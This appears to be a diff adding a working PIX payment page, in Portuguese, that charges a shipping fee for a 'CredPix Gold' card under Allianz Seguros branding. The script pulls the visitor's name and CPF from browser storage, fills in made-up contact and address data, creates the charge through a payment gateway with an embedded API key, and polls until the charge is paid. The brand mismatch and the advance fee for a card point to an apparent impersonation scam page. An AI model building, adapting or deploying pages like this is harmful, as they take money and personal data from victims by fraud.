@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-59CWZV26');</script>
+<!-- End Google Tag Manager -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Pagamento PIX – Cartão CredPix Gold</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="config.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f0f4fa; min-height: 100dvh; display: flex; flex-direction: column; }
+
+    .m2-header { background: linear-gradient(135deg, #003781 0%, #0054b4 100%); padding: 24px 24px 28px; }
+    .m2-header-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 18px; }
+    .m2-brand { font-size: 18px; font-weight: 900; color: #fff; }
+    .m2-policy-label { font-size: 10px; color: rgba(255,255,255,0.4); text-transform: uppercase; }
+    .m2-policy-num { font-size: 16px; font-weight: 800; color: #93c5fd; }
+    .m2-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; background: rgba(255,255,255,0.06); border-radius: 12px; padding: 14px 16px; }
+    .m2-info-label { font-size: 10px; color: rgba(255,255,255,0.35); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 4px; }
+    .m2-info-value { font-size: 14px; font-weight: 700; color: #fff; }
+
+    .card { background: #fff; border-radius: 16px; margin: 20px 16px; padding: 24px 20px; box-shadow: 0 2px 16px rgba(0,55,129,0.08); }
+    .card-title { font-size: 16px; font-weight: 800; color: #0f172a; text-align: center; margin-bottom: 4px; }
+    .card-sub { font-size: 13px; color: #64748b; text-align: center; margin-bottom: 20px; }
+
+    .amount { text-align: center; margin-bottom: 20px; }
+    .amount-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; font-weight: 700; }
+    .amount-value { font-size: 34px; font-weight: 900; color: #003781; margin-top: 4px; }
+
+    .qr-wrap { display: flex; justify-content: center; margin-bottom: 16px; }
+    .qr-wrap img { width: 200px; height: 200px; border-radius: 12px; border: 2px solid #e2e8f0; }
+
+    .copy-wrap { margin-bottom: 16px; }
+    .copy-label { font-size: 12px; color: #64748b; font-weight: 600; margin-bottom: 6px; }
+
+    .timer { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 16px; }
+    .timer-count { font-weight: 700; color: #dc2626; }
+
+    .steps { border-top: 1px solid #e2e8f0; padding-top: 16px; }
+    .steps-title { font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
+    .step { display: flex; gap: 10px; margin-bottom: 10px; align-items: flex-start; }
+    .step-num { min-width: 22px; height: 22px; background: #003781; color: #fff; border-radius: 50%; font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .step-text { font-size: 13px; color: #475569; line-height: 1.4; }
+
+    .loading { text-align: center; padding: 40px 20px; color: #94a3b8; }
+    .spinner { width: 36px; height: 36px; border: 3px solid #e2e8f0; border-top-color: #003781; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .error-card { background: #fff5f5; border: 1.5px solid #fecaca; border-radius: 12px; padding: 20px; text-align: center; color: #dc2626; margin: 20px 16px; }
+    .error-card h3 { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
+    .error-card p { font-size: 13px; opacity: 0.8; }
+  </style>
+</head>
+<body>
+
+
+<div class="m2-header">
+    <div class="m2-header-top">
+        <div class="m2-brand">Allianz Seguros</div>
+        <div style="text-align:right;">
+            <div class="m2-policy-label">APOLICE</div>
+            <div class="m2-policy-num">#ALZ-1429</div>
+        </div>
+    </div>
+    <div class="m2-info-grid">
+        <div><div class="m2-info-label">Segurado</div><div class="m2-info-value" id="leadNome">Carregando...</div></div>
+        <div><div class="m2-info-label">CPF</div><div class="m2-info-value" id="leadCpf">***.***.***-**</div></div>
+    </div>
+</div>
+<script>
+(function() {
+    var nome = localStorage.getItem('nomeUsuario') || '';
+    var cpf  = localStorage.getItem('cpfUsuario')  || '';
+    var leadNomeEl = document.getElementById('leadNome');
+    var leadCpfEl  = document.getElementById('leadCpf');
+    if (leadNomeEl && nome) {
+        var parts = nome.trim().split(/\s+/);
+        leadNomeEl.textContent = parts.length > 1 ? parts[0] + ' ' + parts[parts.length - 1] : nome;
+    }
+    if (leadCpfEl && cpf) {
+        var d = cpf.replace(/\D/g, '');
+        if (d.length === 11) leadCpfEl.textContent = '***.' + d.slice(3,6) + '.' + d.slice(6,9) + '-**';
+    }
+})();
+</script>
+
+<div id="main-content">
+  <div class="loading">
+    <div class="spinner"></div>
+    <div>Gerando QR Code PIX...</div>
+  </div>
+</div>
+
+<script>
+function copyToClipboard(text) {
+  if (navigator.clipboard && window.isSecureContext) {
+    return navigator.clipboard.writeText(text);
+  } else {
+    const el = document.createElement('textarea');
+    el.value = text;
+    el.style.position = 'fixed';
+    el.style.opacity = '0';
+    document.body.appendChild(el);
+    el.focus();
+    el.select();
+    try { document.execCommand('copy'); } catch(e) {}
+    document.body.removeChild(el);
+    return Promise.resolve();
+  }
+}
+
+(function () {
+  const tipoFrete = localStorage.getItem('tipo_frete_cartao') || 'normal';
+  const valor = tipoFrete === 'expresso' ? 2490 : 1990;
+
+  const nome  = localStorage.getItem('nomeUsuario')    || '';
+  const cpf   = localStorage.getItem('cpfUsuario')     || '';
+  const email = localStorage.getItem('emailUsuario')   || (cpf.replace(/\D/g,'') + '@credpix.com.br');
+  const tel   = localStorage.getItem('telefoneUsuario')|| '11999999999';
+
+  const EXPIRY_SECONDS = 15 * 60;
+  let transactionId = null;
+  let copyPaste = '';
+  let pollTimer = null;
+  let countdownTimer = null;
+  let secondsLeft = EXPIRY_SECONDS;
+
+  function fmt(v) {
+    return (v / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+  }
+
+  function formatTime(s) {
+    const m = Math.floor(s / 60);
+    const ss = s % 60;
+    return `${m}:${ss.toString().padStart(2, '0')}`;
+  }
+
+  function renderCheckout() {
+    const el = document.getElementById('main-content');
+    el.innerHTML = `
+      <div class="card">
+        <div class="card-title">Pague com PIX</div>
+        <div class="card-sub">Frete ${tipoFrete === 'expresso' ? 'Expresso' : 'Normal'} – Cartão CredPix Gold</div>
+
+        <div class="amount">
+          <div class="amount-label">Valor do frete</div>
+          <div class="amount-value">${fmt(valor)}</div>
+        </div>
+
+        <div class="qr-wrap">
+          <div id="qr-code"></div>
+        </div>
+
+        <div class="timer">Expira em <span class="timer-count" id="timer-count">${formatTime(secondsLeft)}</span></div>
+
+        <div class="copy-wrap">
+          <div class="copy-label">Código PIX Copia e Cola</div>
+          <div style="display:flex;align-items:center;gap:8px;">
+            <div id="pix-code-display" style="flex:1;background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:12px 16px;font-size:13px;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#334155;cursor:default;"></div>
+            <button id="copy-btn" onclick="copiarPix()" style="background:#003781;color:white;border:none;border-radius:8px;padding:12px 20px;font-weight:700;font-size:14px;cursor:pointer;white-space:nowrap;flex-shrink:0;">Copiar</button>
+          </div>
+        </div>
+
+        <div class="steps">
+          <div class="steps-title">Como pagar</div>
+          <div class="step"><div class="step-num">1</div><div class="step-text">Abra o aplicativo do seu banco</div></div>
+          <div class="step"><div class="step-num">2</div><div class="step-text">Escolha pagar via PIX com QR Code ou Copia e Cola</div></div>
+          <div class="step"><div class="step-num">3</div><div class="step-text">Escaneie o QR Code ou cole o código copiado</div></div>
+          <div class="step"><div class="step-num">4</div><div class="step-text">Confirme o pagamento e aguarde a aprovação</div></div>
+        </div>
+      </div>
+    `;
+  }
+
+  function startCountdown() {
+    countdownTimer = setInterval(() => {
+      secondsLeft = Math.max(0, secondsLeft - 1);
+      const el = document.getElementById('timer-count');
+      if (el) el.textContent = formatTime(secondsLeft);
+      if (secondsLeft === 0) clearInterval(countdownTimer);
+    }, 1000);
+  }
+
+  async function checkStatusBynet(config) {
+    if (!transactionId) return false;
+    try {
+      const c = config.gateways.bynet;
+      const r = await fetch(`${API_BASES.bynet}/api/user/transactions/${transactionId}`, { headers: { 'x-api-key': c.api_key, 'User-Agent': 'AtivoB2B/1.0' } });
+      if (!r.ok) return false;
+      const data = await r.json();
+      return data?.data?.status === 'PAID';
+    } catch(e) { return false; }
+  }
+
+  function startPolling(config) {
+    pollTimer = setInterval(async () => {
+      if (await checkStatusBynet(config)) {
+        clearInterval(pollTimer);
+        clearInterval(countdownTimer);
+        window.location.href = '/pay/sucesso2.html';
+      }
+    }, 5000);
+  }
+
+  window.copiarPix = function () {
+    if (!copyPaste) return;
+    copyToClipboard(copyPaste).then(() => {
+      const btn = document.getElementById('copy-btn');
+      btn.textContent = 'Copiado!';
+      btn.style.background = '#059669';
+      setTimeout(() => {
+        btn.textContent = 'Copiar';
+        btn.style.background = '#003781';
+      }, 2000);
+    });
+  };
+
+  async function init() {
+    try {
+      const config = (typeof GLOBAL_CONFIG !== 'undefined') ? GLOBAL_CONFIG : null;
+      if (!config?.activeGateway) throw new Error('Gateway não configurado.');
+      const pixChaveRaw = localStorage.getItem('pixChave') || '';
+      const isEmailChave = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(pixChaveRaw);
+      const phoneClean = pixChaveRaw.replace(/\D/g,'');
+      const customerPhone = !isEmailChave && phoneClean.length >= 10 ? phoneClean : '11999999999';
+      const customerEmail = isEmailChave ? pixChaveRaw : 'user' + cpf.replace(/\D/g,'') + '@CredPix.com.br';
+      const customer = { name: nome || 'CLIENTE', email: customerEmail, cpf: cpf.replace(/\D/g,''), phone: customerPhone };
+      const product = `Frete ${tipoFrete === 'expresso' ? 'Expresso' : 'Normal'} - Cartão CredPix Gold`;
+
+      const bynetC = config.gateways.bynet;
+      const addr = { street: 'Rua Principal', streetNumber: '1', complement: '', zipCode: '01001000', neighborhood: 'Centro', city: 'Sao Paulo', state: 'SP', country: 'BR' };
+      const body = { amount: valor, paymentMethod: 'PIX', customer: { name: customer.name, email: customer.email, document: { number: customer.cpf, type: 'CPF' }, phone: customer.phone, externalRef: customer.cpf + '-' + Date.now(), address: addr }, shipping: { fee: 0, address: addr }, items: [{ title: product, unitPrice: valor, quantity: 1, tangible: false, externalRef: 'checkout2' }], pix: { expiresInDays: 1 }, metadata: getUtmMetadata() };
+      const r = await fetch(`${API_BASES.bynet}/api/user/transactions`, { method: 'POST', headers: { 'x-api-key': bynetC.api_key, 'User-Agent': 'AtivoB2B/1.0', 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+      if (!r.ok) throw new Error(`Bynet ${r.status}`);
+      const resp = await r.json();
+      const txData = resp.data;
+
+      transactionId = txData?.id || '';
+      copyPaste = txData?.pix?.qrcode || txData?.qrCode || '';
+
+      renderCheckout();
+      const displayEl = document.getElementById('pix-code-display');
+      if (displayEl) displayEl.textContent = copyPaste || '—';
+      if (copyPaste) {
+        const qrContainer = document.getElementById('qr-code');
+        if (qrContainer) {
+          qrContainer.innerHTML = '';
+          try {
+            new QRCode(qrContainer, { text: copyPaste, width:200, height:200, colorDark:'#000000', colorLight:'#ffffff', correctLevel: QRCode.CorrectLevel.M });
+          } catch(e) {
+            qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(copyPaste)}" style="width:200px;height:200px;">`;
+          }
+        }
+      }
+      startCountdown();
+      if (transactionId) startPolling(config);
+    } catch (err) {
+      document.getElementById('main-content').innerHTML = `
+        <div class="error-card">
+          <h3>Erro ao gerar PIX</h3>
+          <p>${err.message || 'Tente novamente em alguns instantes.'}</p>
+        </div>
+      `;
+    }
+  }
+
+  init();
+
+  // Modo teste
+  if (new URLSearchParams(window.location.search).get('test') === '1') {
+    setTimeout(function() {
+      var testBtn = document.createElement('button');
+      testBtn.textContent = '✓ Simular pagamento confirmado';
+      testBtn.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:12px 20px;font-size:14px;font-weight:600;cursor:pointer;z-index:9999;box-shadow:0 4px 12px rgba(0,0,0,0.3);';
+      testBtn.onclick = function() { window.location.href = '/pay/sucesso2.html'; };
+      document.body.appendChild(testBtn);
+    }, 1000);
+  }
+})();
+</script><!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-59CWZV26"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+</body>
+</html>
